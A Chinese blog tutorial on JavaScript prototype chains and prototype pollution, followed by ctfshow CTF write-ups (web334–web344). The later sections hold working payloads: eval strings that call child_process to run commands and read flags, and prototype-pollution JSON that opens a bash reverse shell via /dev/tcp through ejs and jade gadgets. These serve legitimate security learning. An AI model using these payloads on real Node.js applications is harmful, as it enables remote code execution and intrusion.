+++
title = 'JavaScript原型链和原型链污染'
date = '2023-11-09T11:06:14+08:00'
categories = ['学习', '安全', 'nodejs']
tags = ['原型链污染', 'ctfshow', 'js']
+++

# JavaScript原型链和原型链污染

## 前置知识

JavaScript中没有引入像类一样的概念，要定义一个类，要以构造函数的方式来定义。

```js
function Foo() {
    this.bar = 1
}
new Foo()
```

`Foo`函数的内容，就是`Foo`类的构造函数，而`this.bar`就是`Foo`类的一个属性。

### 同步和异步:

贴张图，说的很明白了。
![image-20231107131013857](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071310891.png)

### 什么是原型？ 

原型：JS中的对象包含了一个prototype的内部属性，这个属性所对应的就是该对象的原型。

js中的所有引用类型（函数 ，数组，对象）都有______proto______属性(隐式原型)，而函数除了有______proto______属性，还拥有一个prototype属性(显式原型)。

![image-20230912120318996](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309121203079.png)

![image-20230916224116350](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309162241435.png)

### 原型对象(prototype)

当创建一个函数时，该函数会自动带有prototype属性(上面说了)，这个属性是一个指针，指向了一个对象，这个对象就是原型对象。
默认情况下，所有原型对象都会自动获得一个`constructor（构造函数）`属性，这个属性是一个指向prototype属性所在函数的指针。也就是说，==每个构造函数(constructor)都有一个原型对象(prototype)==。

![image-20230917110844642](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309171108707.png)

### 理清一下

每个构造函数都有一个 `prototype` 原型对象,

每个实例对象(object)都有一个 `__proto__` 属性，指向它的构造函数的原型对象( `prototype`)

所有原型对象都会自动获得一个`constructor（构造函数）`属性，这个属性是一个指向prototype属性所在函数的指针

```js
function  A(){
    //console.log ('111');

}
var B=new A();

if (B.__proto__===A.prototype) {//实例对象B的隐式原型(__proto__)指向它构造函数的显式原型(prototype),指向就是恒等于
    console.log ('666');
     
}//输出666

```

这里B是一个实例对象，访问其______proto______属性-->指向构造函数(A)的原型对象prototype-->构造函数的constructor属性

1. `prototype`是一个类的属性，所有类对象在实例化的时候将会拥有`prototype`中的属性和方法

2. 一个对象的`__proto__`属性，指向这个对象所在的类的`prototype`属性

   p神的原话。

### JavaScript原型链继承

第一条举个例子

```js
function  A(){
    this.game='cf';
    //console.log ('111');
}
function B(){
    this.player='168';
}
B.prototype=new A();
let c=new B();
console.log(`${c.game} ${c.player}`);
```

B类继承了A类的game属性，最后输出cf 168，这里对象c在查找game属性时，过程如下：

1.先在c对象中查找

2.如果找不到，则在c.______proto______中查找

3.如果还找不到，则在c.______proto______.______proto______中查找

4.重复如上操作，直到找不到，null结束。

也就是说 ==所有的 JavaScript 对象都会从一个 prototype（原型对象）中继承属性和方法。==

### Object.prototype

Object.prototype是一切对象的根源，根源之上再没有其他根源。比如Object.prototype.**__**proto**__**就是null

所有函数的默认原型都是Object的实例，因此默认原型都会包含一个内部指针，指向`Object.prototype`。

```js
function  A(){
    //console.log ('111');

}
var B=new A();

if (B.__proto__.__proto__===Object.prototype) {
    console.log ('666');
    
}//输出666
if (A.prototype.__proto__===Object.prototype) {
    console.log ('666');
    
}//输出666
```



## 原型链污染

什么是原型链污染呢？像刚才在继承时举的例子一样，c.______proto______指向了A类的prototype，我们可不可以不修改A类而给A类添加一个属性呢？答案是可以的，这样造成了污染。如下代码：

```js
function  A(){
    this.game='cf';
    //console.log ('111');
}
function B(){
    this.player='168';
}
B.prototype=new A();
let c=new B();
console.log(`${c.game} ${c.player}`);.//cf 168

// console.log(c.__proto__);
c.__proto__.game='lol';
c.__proto__['user']='admin';
console.log(c.user);//admin

let D =new B;
console.log(D.game);//lol
```

![image-20230912191200859](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309121912902.png)

我们可以看到上面的输出，我们修改和添加对象c的原型的属性，会影响到另一个对象D(和c具有相同的原型对象)，那么，当攻击者控制了一个对象的原型，那么将影响所有的和这个对象来自同一个类、父祖类的对象。这种攻击方式就是**原型链污染**。

再看一个

```js
let A={
    game: 'cf'
}
console.log(A.game)//cf
A.__proto__.game='lol';//修改A的原型，即Object
let B={}

console.log(A.game)//cf 查找顺序的原因

console.log(B.game)//lol
```

![image-20230912192952246](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309121929277.png)

这里的A.______proto______就是Object.prototype。

## 利用手段

1.merge等对象递归合并操作

2.克隆对象(clone)

举个merge的例子：

```js
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

这里的 target[key] = source[key]存在一个赋值的操作，如果key为______proto______,就能进行原型链污染了，

上实战更好理解一点。

## ctfshow:

### web334

```js
var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
  //items: [
 //  {username: 'CTFSHOW', password: '123456'}
//  ]
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });//在请求体中看username不能等于CTFSHOW 请求体中的username经过大写转换要等于CTFSHOW 这里使用不存大写就绕过了，然后密码为123456
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){//user返回1 进入if
    req.session.regenerate(function(err) {//当前会话错误 登录失败
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;//user.username保存到session的loginUser属性中
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag}); //登录成功给flag             
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;

```

登录Ctfshow 123456即可。

![image-20231107124754821](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071247864.png)



### web335

![image-20231107125218112](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071252138.png)

给出一个提示,应该是一个命令执行，之前还没接触过nodejs的命令执行，上网找找。
可以找到child_process模块中的`exec`与`execSync`函数，他们是模块里面最简单的函数，作用是执行一个固定的系统命令。

`child_process.exec(command[, options][, callback])`
command：要执行的命令。
options:可选项
callback:当进程终止时使用输出调用。
创建一个shell然后在shell里执行命令，回调函数接收两个参数，error,stdout,然后将执行的结果标准输出

```js
let shell=require('child_process')

shell.exec('dir',(error,stdout) => {
    if(err) {
        console.log(err);
        return;
    }
    console.log(stdout)//标准输出
})
```

![image-20231107133300239](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071333267.png)

`child_process.execSync(command[, options])`

`execSync`是`exec`的同步版本。

这里直接构造。

```js
/?eval=require('child_process').execSync('ls')
/?eval=require('child_process').execSync('cat f*')
```

![image-20231107134919130](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071349164.png)

### web336

和335一样给了一个eval的提示，但是这道应该是给execSync给禁用了。
使用__filename变量来查看一下当前模块文件的绝对路径。
![image-20231107191053872](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071910920.png)

尝试读取文件。使用nodejs中的fs模块

```js
require('fs').readFileSync('/app/routes/index.js ')
```

![image-20231107191725485](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071917521.png)

我们可以使用spawnSyc来执行命令，
![image-20231107192014397](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071920430.png)

```js
require('child_process').spawnSync('ls').stdout.toString()//spawnSync返回一个子程序执行结果的对象，通过stdout标准输出，toString()将其转换为字符串
require('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString()//'cat',['fl001g.txt'] 后面是参数
```

![image-20231107193739226](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071937265.png)

也可以使用fs模块读取文件

```js
require('fs').readFileSync('fl001g.txt')
```

在php中我们可以使用拼接绕过，这里也是可以的

```js
eval("require('child_process').exe"%2b"cSync('ls')")
eval("require('child_process').exe"%2b"cSync('cat f*')")
```

因为+号会被解析为空格，这里编码。

![image-20231107194738137](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071947177.png)

### web337

```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;//req.query 获取http请求中的查询参数
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;

```

可以看到是一个md5的比较，和php一样，使用数组绕过。
![image-20231107195733568](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311071957608.png)

### web338

![image-20231107200006570](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311072000607.png)

看代码这部分，如果secert中的ctfshow属性等于36dboy，输出flag。

![image-20231107200235155](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311072002196.png)

再看这一部分，将空对象user和请求body作为参数调用copy对象，而这个copy函数，很明显的一个原型链污染。

```json
{"username":"1",
"password":"1",
"__proto__":{"ctfshow":"36dboy"}
}
```

这里直接污染Object，添加一个ctfshow属性。

![image-20231107211353424](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311072113524.png)

### web339

![image-20231107203833128](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311072038194.png)

这里我们是不知道flag的。

![image-20231107203909107](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311072039167.png)

我们看这里，在js中函数实际就是一个对象，那么这里query就是一个Function对象。看个例子

```js
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }

user = {}
body = JSON.parse('{"__proto__":{"query":"return 1"}}');
copy(user, body)
{ query: Function(query)}
{ query: Function(query)(query)}

console.log(query)//return 1
```

那么只要污染了query对象，就能够执行命令了。

```js
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\"')"}}
```

### web340

​	![image-20231109163145404](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311091631474.png)

这里调用copy函数，第一个参数变成了user.userinfo。相当于user对象里面还有一个对象，``user.__proto__.__proto__``才是Object。
![image-20231109164217240](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311091642274.png)

query还在,那么还污染它。

```js
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\"')"}}}
```

### web341

ejs rce

```js
{"__proto__":{"__proto__":{"outputFunctionName":"__tmp1; global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxxxx/1211 0>&1\"'); var __tmp2"}}}
```

[再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7025)

### web342-web343

jade 原型链污染rce https://xz.aliyun.com/t/7025

```js
{"__proto__":{"__proto__": {"type":"Code","compileDebug":true,"self":true,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxxxx/1211 0>&1\"');//"}}}
```

### web344

```js
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }

});
```

url中不能包含 8c,2c,逗号，他们要我们构造的是:

```js
?query={"name":"admin","password":"ctfshow","isVIP":true}
```

明显是会被匹配到的。

```js
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```

nodejs会把这几部分拼接。ctfshwo的c要编码是因为`"`的url编码为%22，和c结合会被匹配到。
